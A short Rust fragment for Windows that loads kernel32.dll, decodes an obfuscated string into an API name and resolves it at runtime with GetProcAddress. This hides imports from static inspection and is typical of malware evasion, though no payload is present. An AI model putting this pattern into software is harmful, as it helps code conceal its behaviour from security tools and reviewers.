unsafe fn resolve() {
    let module = LoadLibraryA(b"kernel32.dll\0".as_ptr());
    let name = decode("vUe;eJofsmh@rm.J:FjL-#vD:U.#trailing-noise", 62, 21);
    let _address = GetProcAddress(module, name.as_ptr());
}
